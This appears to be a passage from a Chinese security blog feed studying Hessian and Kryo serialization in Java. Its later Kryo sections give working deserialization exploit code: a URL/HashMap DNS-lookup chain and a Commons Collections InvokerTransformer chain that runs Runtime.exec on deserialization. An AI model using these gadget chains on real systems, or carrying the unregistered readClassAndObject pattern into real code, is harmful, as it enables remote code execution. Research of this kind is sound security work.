<h3 id="Serialize-and-DeSerialize"><a href="#Serialize-and-DeSerialize" class="headerlink" title="Serialize and DeSerialize"></a>Serialize and DeSerialize</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLData;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HJSerializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(os);</span><br><span class="line">            output.writeObject(t);</span><br><span class="line">            data = os.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(is);</span><br><span class="line">            result = input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (T) result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">111</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hessian&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Class&lt;Object&gt;&gt;();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>, ObjectInputStream.class);</span><br><span class="line">        innerMap.put(<span class="string">&quot;2&quot;</span>, SQLData.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">friend</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">222</span>, <span class="string">&quot;hessian1&quot;</span>, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">friends</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Student&gt;();</span><br><span class="line">        friends.add(friend);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        stu.setId(id);</span><br><span class="line">        stu.setName(name);</span><br><span class="line">        stu.setGender(gender);</span><br><span class="line">        stu.setInnerMap(innerMap);</span><br><span class="line">        stu.setFriends(friends);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian serialize----------------&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] obj = serialize(stu);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(obj));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian deserialize--------------&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> deserialize(obj);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>1.首先通过需要序列化的类，获取到相应的serializer，在通过这个serializer进行writeobject操作<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p>
<p>2.一般对于自己写的class，他就会获取到defaultserializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p>
<p>3.在获取serializer的过程中，他会去读取Object中的fields，并对应上serializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p>
<p>4.获取完serializer，他会有一个将序列化的obj作为key，serializer作为value，加入到一个map和一个cachemap中<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p>
<p>5.接着就是常规的获取field，然后在根据field的serializer写入数据了<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt><br>大概过程就是</p>
<ul>
<li>获取序列化对象相对应的serializer，并获得到fields，每个fields会依次对应上一个serializer</li>
<li>将serializer加入map和cachemap中</li>
<li>根据fields写入序列化数据</li>
</ul>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>首先看到他读取了序列化数据中的第一个字节，并判断是属于那种类型的，并在下面的switch语句中选择使用哪种Serializer去进行序列化，在这里是Map，注意这里的Map并不是说反序列化的类是Map类型的，而是所有Object类型都会被这个readMap处理用来反序列化<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt><br>接下来就是常规的根据field然后deserialize<br>在这里的具体操作就是根据变量名获取到相应的deserialize<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt><br>再在deserialize中获取value，并设置field</p>
<p><strong>上面的操作最好还是要自己跟一遍</strong></p>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>与kryo类似，hessian也是因为反序列化Map类型时会调用put方法<br>那利用点也是从hashCode与equals入手了<br>在这里就不重复造轮子了，可以参考这篇文章</p>
<ul>
<li><a href="https://paper.seebug.org/1131/">https://paper.seebug.org/1131/</a></li>
<li>参考marshalsec</li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>反序列化</tag>
        <tag>hessian</tag>
      </tags>
  </entry>
  <entry>
    <title>kryo反序列化</title>
    <url>/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="入门kryo"><a href="#入门kryo" class="headerlink" title="入门kryo"></a>入门kryo</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>首先看个简单的demo<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String hello;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;hello=&#x27;&quot;</span> + hello + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, num=&quot;</span> + num +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHello</span><span class="params">(String hello)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hello = hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(MyClass.class);</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        myClass.setHello(<span class="string">&quot;Hello Kryo&quot;</span>);</span><br><span class="line">        myClass.setNum(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output, myClass);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">        input.close();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="3种序列化与反序列化"><a href="#3种序列化与反序列化" class="headerlink" title="3种序列化与反序列化"></a>3种序列化与反序列化</h3><p>如果是知道序列化类型，并且不为空<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.writeObject(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObject(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果是知道序列化类型，并且有可能为空<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.writeObjectOrNull(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObjectOrNull(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果都是不确定的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.writeClassAndObject(output, object);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line"><span class="keyword">if</span> (object <span class="keyword">instanceof</span> SomeClass) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="kryo注册"><a href="#kryo注册" class="headerlink" title="kryo注册"></a>kryo注册</h3><blockquote>
<p>当不知道序列化的类是什么的时候可以不用注册，一般是为了提高反序列化的效率启用这种注册功能。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class);</span><br><span class="line"><span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> ...</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> ...</span><br><span class="line">kryo.writeObject(output, object);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class, <span class="number">9</span>);</span><br><span class="line">kryo.register(AnotherClass.class, <span class="number">10</span>);</span><br><span class="line">kryo.register(YetAnotherClass.class, <span class="number">11</span>);</span><br></pre></td></tr></table></figure>
<p>看到上面两段代码，第一个没有id，他会自动给你分配id，后面那段是在参数中提供id，这个id在序列化和反序列化的时候要保持一致，不能用9的去反序列化10的</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>首先获取前面获取的register<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt><br>然后就开始写入序列化数据<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt><br>最后会根据serializer类型写入序列化数据，在这里的serializer就是string类型的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt><br>更加详细的就不说了，还是得自己调试才行，总体流程就是</p>
<ul>
<li>获取registration</li>
<li>获取filed，进行filed.write</li>
<li>在write中获取相对应的serializer</li>
<li>调用serializer.write，进行最后的写入</li>
</ul>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化的流程与序列化基本一致，只不过就是把write改为了read<br>当反序列化的类型为一个Object类型的时候，可以看到如下的过程，先创建一个Object的实例，接着循环把成员变量那些给赋值上<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br>看看Create中的实现<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt><br>他主要有几个步骤</p>
<ul>
<li>获取到无参构造</li>
<li>如果是private类型，就先让他变成可以访问的 -&gt; <em>ctor.setAccessible(true);</em></li>
<li>调用无参构造函数，并返回该实例</li>
</ul>
<p>但是有些利用链可能没有无参构造这时候应该怎么办<br>看到官网<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt></p>
<blockquote>
<p>The Objenesis StdInstantiatorStrategy uses JVM specific APIs to create an instance of a class without calling any constructor at all. Using this is dangerous because most classes expect their constructors to be called.<br><code>kryo.setInstantiatorStrategy(new DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));</code><br>当设置这个策略的时候会不调用任何的构造函数</p>
</blockquote>
<h2 id="常用调用链"><a href="#常用调用链" class="headerlink" title="常用调用链"></a>常用调用链</h2><p>常用的调用链基本是因为HashMap.put中,会调用到key的equals方法和hashcode方法，而key又是我们可控的，这时候就可以进行一些常规的调用链利用了<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt><br>首先看到他先反序列化了key，接着反序列化了value，最后进行了put操作</p>
<h3 id="hashCode利用"><a href="#hashCode利用" class="headerlink" title="hashCode利用"></a>hashCode利用</h3><p><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" alt><br>可以看到hash中触发了key的hashcode方法</p>
<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>首先是最简单的URL利用链<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://x.xxx.tu4.org&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, <span class="number">0</span>, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>具体就不分析了，就是会触发URL.hashcode最后触发dnslog</p>
<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a><h3 style="text-decoration: line-through;">TiedMapEntry</h3></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.Test.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">mp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;lsf&quot;</span>);</span><br><span class="line">        lazymap.clear();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazymap,ct);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> tiedMapEntry;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
